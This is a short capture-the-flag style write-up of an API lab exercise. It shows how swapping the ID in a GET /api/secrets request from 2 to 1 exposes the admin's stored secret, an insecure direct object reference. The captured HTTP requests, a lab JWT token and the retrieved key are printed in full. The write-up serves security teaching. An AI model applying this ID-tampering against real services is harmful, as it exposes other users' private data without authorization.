API 01


Solving API 01

This exercise is the API version of an exercise you already solved in the Essential Badge. 
You should use it to get more confident with discovering vulnerabilities without any hint on what to look for.

This challenge

In this challenge, your goal is to find the vulnerability that will allow you to access the key for this exercise. 
The user admin@libcurl.so has stored the key as a secret in their account. Try to retrieve it.

Recommandations

This challenge is based on a challenge from the Essential badge. 
Use it to increase your testing ability and learn how to discover vulnerability when little information is provided.

 You can access this exercise using the following URL: http://ptl-b6811efb-833a4227.libcurl.so/. 

 Steps:
    1) Visit the given URL: http://ptl-b6811efb-833a4227.libcurl.so. 
    2) Register your credientials and login.
    3) Make a New Secret. Reload the page it shows 404 error.
         [ While you're doing these steps burp should be on.]
    4) Abserve the procedure in HTTP history.
        See JSON file with might have 200 status.
        Get     /api/secrets/2
        But why 2? Why not 1? Might be the secret key is in API 1.
    5) You'll get api/secrets/2 

        Request:

    GET /api/secrets/2 HTTP/1.1
Host: api-ptl-b6811efb-833a4227.libcurl.so
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwiZXhwIjoxNjMwODY0NTE3fQ.PWRLBzl3VoeXrc-IJGX44N_YJ1wDSb-S_3XwI0M9RPQ
Origin: http://ptl-b6811efb-833a4227.libcurl.so
Connection: close
Referer: http://ptl-b6811efb-833a4227.libcurl.so/

It works in our account but we have to access another 1 or rest of others.

GET /api/secrets/1 HTTP/1.1
Host: api-ptl-b6811efb-833a4227.libcurl.so
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwiZXhwIjoxNjMwODY0NTE3fQ.PWRLBzl3VoeXrc-IJGX44N_YJ1wDSb-S_3XwI0M9RPQ
Origin: http://ptl-b6811efb-833a4227.libcurl.so
Connection: close
Referer: http://ptl-b6811efb-833a4227.libcurl.so/


As as while, we replace 2 with 1 and it really worked. We can see the secret key value as: 
{"secret":{"id":1,"name":"PTLAB_KEY",
"value":"bcaa8db5-f0a9-45fd-ab66-bd2d70ed0855",
"createdAt":"2021-07-07T13:09:35.744Z",
"updatedAt":"2021-07-07T13:09:35.761Z",
"owner":{"username":"admin","bio":null}}}

Happy Hacking!! :) 